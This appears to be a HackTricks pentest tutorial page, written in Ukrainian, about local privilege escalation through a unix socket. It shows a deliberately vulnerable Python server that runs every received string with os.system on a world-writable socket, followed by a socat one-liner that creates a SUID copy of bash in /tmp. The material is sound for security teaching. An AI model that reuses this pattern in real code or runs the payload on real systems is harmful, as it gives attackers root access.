{{#include ../../banners/hacktricks-training.md}}

## Приклад прив'язки сокета з Python

У наступному прикладі **unix-сокет створюється** (`/tmp/socket_test.s`), і все, що **отримується**, буде **виконано** за допомогою `os.system`. Я знаю, що ви не знайдете це в диких умовах, але мета цього прикладу - побачити, як виглядає код, що використовує unix-сокети, і як управляти введенням у найгіршому випадку.
```python:s.py
import socket
import os, os.path
import time
from collections import deque

if os.path.exists("/tmp/socket_test.s"):
os.remove("/tmp/socket_test.s")

server = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
server.bind("/tmp/socket_test.s")
os.system("chmod o+w /tmp/socket_test.s")
while True:
server.listen(1)
conn, addr = server.accept()
datagram = conn.recv(1024)
if datagram:
print(datagram)
os.system(datagram)
conn.close()
```
**Виконайте** код за допомогою python: `python s.py` та **перевірте, як сокет слухає**:
```python
netstat -a -p --unix | grep "socket_test"
(Not all processes could be identified, non-owned process info
will not be shown, you would have to be root to see it all.)
unix  2      [ ACC ]     STREAM     LISTENING     901181   132748/python        /tmp/socket_test.s
```
**Експлуатація**
```python
echo "cp /bin/bash /tmp/bash; chmod +s /tmp/bash; chmod +x /tmp/bash;" | socat - UNIX-CLIENT:/tmp/socket_test.s
```
{{#include ../../banners/hacktricks-training.md}}
